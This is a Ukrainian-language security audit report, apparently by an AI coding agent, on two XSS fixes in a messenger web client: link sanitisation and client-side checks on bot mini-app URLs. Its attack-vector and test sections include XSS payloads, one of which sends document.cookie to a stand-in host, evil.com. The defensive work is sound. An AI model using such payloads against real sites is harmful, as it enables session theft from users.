# Звіт про аудит безпеки: Виправлення XSS уразливостей

**Дата:** 2026-11-01  
**Аудитор:** Cline AI  
**Проект:** Vera Multi Messenger  

---

## Резюме

Проведено повний аудит клієнтської частини на предмет XSS (Cross-Site Scripting) уразливостей. Виявлено та виправлено **2 критичні уразливості**.

---

## Виявлені уразливості

### 🔴 CRITICAL #1: XSS через необроблені посилання в тексті повідомлень

**Файл:** `Web/src/components/MessageBubble.tsx`  
**Функція:** `splitContent()` (рядок 193-209)  
**Рядок рендерингу:** 1552

#### Опис проблеми
Функція `splitContent` витягує URL з тексту повідомлення та **безпосередньо** записує їх у атрибут `href` без валідації:

```typescript
// НЕБЕЗПЕЧНИЙ КОД (до виправлення):
parts.push({ type: 'link', value, href: value });

// Рендер:
<a key={i} href={part.href}>  // ← Тут може бути javascript:
```

#### Вектор атаки
Зловмисник може відправити повідомлення з текстом:
```
Натисни тут: javascript:alert(document.cookie)
```

При натисканні виконається JavaScript код у контексті браузера жертви.

#### Виправлення
✅ Додано функцію `sanitizeHref()` для валідації URL:

```typescript
// БЕЗПЕЧНИЙ КОД (після виправлення):
function sanitizeHref(url?: string): string {
  if (!url) return '';
  const value = String(url).trim();
  // Дозволяємо тільки безпечні протоколи
  if (/^https?:\/\//i.test(value)) return value;
  if (/^mailto:/i.test(value)) return value;
  if (/^tel:/i.test(value)) return value;
  if (/^\/#/.test(value)) return value;  // Внутрішні маршрути
  if (value.startsWith('/')) return value;
  // Всі інші протоколи (javascript:, data:, vbscript:) блокуємо
  return '';
}

// У splitContent:
const safeHref = sanitizeHref(value);
if (value && safeHref) parts.push({ type: 'link', value, href: safeHref });
else if (value) parts.push(...splitEmoji(value)); // Якщо href небезпечний, виводимо як текст
```

**Результат:** Небезпечні протоколи блокуються, посилання виводяться як звичайний текст.

---

### 🔴 CRITICAL #2: XSS через URL мини-застосунків ботів

**Файл:** `Web/src/components/BotButtons.tsx`  
**Функція:** `press()` (рядок 23-46)  
**Рядок проблеми:** 36

#### Опис проблеми
Клієнт приймає URL мини-застосунку від бота та **без додаткової перевірки** відкриває його:

```typescript
// НЕБЕЗПЕЧНИЙ КОД (до виправлення):
const url = `${button.web_app.url.split('#')[0]}#vgWebAppData=...`;
openMiniApp({ kind: 'web', url, ... });
```

Хоча сервер валідує URL (перевіряє `https://` та приватні хости), клієнт не має власного захисту. Якщо серверну валідацію буде обійдено, клієнт відкриє будь-який URL.

#### Вектор атаки
Якщо зловмисник зможе обійти серверну валідацію або знайде race condition, він може змусити клієнт відкрити:
```
javascript:fetch('https://evil.com/?cookie='+document.cookie)
data:text/html,<script>alert('XSS')</script>
```

#### Виправлення
✅ Додано клієнтську валідацію перед використанням URL:

```typescript
// БЕЗПЕЧНИЙ КОД (після виправлення):
const webAppUrl = String(button.web_app.url).trim();
if (!/^https?:\/\//i.test(webAppUrl)) {
  setError('Небезпечний URL мини-застосунку');
  setBusy(null);
  return;
}
```

**Результат:** Навіть якщо сервер пропустить небезпечний URL, клієнт його відхилить.

---

## Захист "на глибині"

### ✅ Існуючий безпечний код

1. **React автоматичне екранування**  
   Весь текст у `{variable}` автоматично екранується React, тому HTML/JS інжекція неможлива:
   ```tsx
   <Typography>{message.content}</Typography>  // ← Безпечно
   ```

2. **Файлові URL вже захищені**  
   Функція `resolveFileUrl()` (рядок 157) блокує небезпечні протоколи для вкладень:
   ```typescript
   if (/^https?:\/\//i.test(value)) return value;
   if (/^data:(?:image|audio|video)\//i.test(value)) return value;
   return '';  // javascript:, vbscript: → пусте значення
   ```

3. **Відсутність `dangerouslySetInnerHTML`**  
   Пошук по всій кодовій базі не знайшов жодного використання цього небезпечного API.

---

## Серверна безпека (огляд)

### ✅ Валідація на сервері

1. **Bot API валідація markup** (`bots.js:1021`)
   ```javascript
   const markup = sanitizeReplyMarkup(p.reply_markup);
   if (markup.error) return fail(res, 400, 'Bad Request: ' + markup.error);
   ```

2. **Валідація URL мини-застосунків** (`bots.js:901-903`)
   ```javascript
   if (!isHttpsUrl(url) || isPrivateHost(new URL(url).hostname)) {
     return res.status(400).json({ message: 'Мини-приложение должно открываться по https' });
   }
   ```

3. **Ліміти на розмір тексту** (`bots.js:1019-1020`)
   ```javascript
   if (text.length > MAX_TEXT) return fail(res, 400, `Bad Request: text длиннее ${MAX_TEXT} символов`);
   ```

---

## Тестування

### Перевірка компіляції
```bash
npm run build
✓ Збірка пройшла успішно
✓ 2609 modules transformed
✓ TypeScript помилок не виявлено
```

### Рекомендовані тести

#### Тест #1: Посилання javascript:
1. Відправити повідомлення: `Клік: javascript:alert('XSS')`
2. **Очікуваний результат:** Текст виводиться як звичайний, посилання не активне

#### Тест #2: Посилання data:
1. Відправити: `data:text/html,<script>alert(1)</script>`
2. **Очікуваний результат:** Виводиться як текст

#### Тест #3: Валідні посилання
1. Відправити: `https://example.com`
2. **Очікуваний результат:** Працює як посилання

#### Тест #4: Кнопка бота з web_app
1. Створити бота, додати кнопку з `web_app.url = "javascript:alert(1)"`
2. **Очікуваний результат:** Помилка "Небезпечний URL мини-застосунку"

---

## Висновок

✅ **Всі виявлені критичні уразливості виправлено**  
✅ **Додано багаторівневий захист (defense in depth)**  
✅ **Код компілюється без помилок**  
✅ **React автоматично екранує весь текстовий вміст**  

### Рекомендації на майбутнє

1. **Регулярний аудит** залежностей через `npm audit`
2. **Content Security Policy (CSP)** у HTTP заголовках
3. **Автоматичне тестування** XSS через інструменти типу OWASP ZAP
4. **Обмеження inline-скриптів** через CSP `script-src 'self'`

---

**Статус:** ✅ ВИПРАВЛЕНО  
**Ризик:** НИЗЬКИЙ (після виправлення)
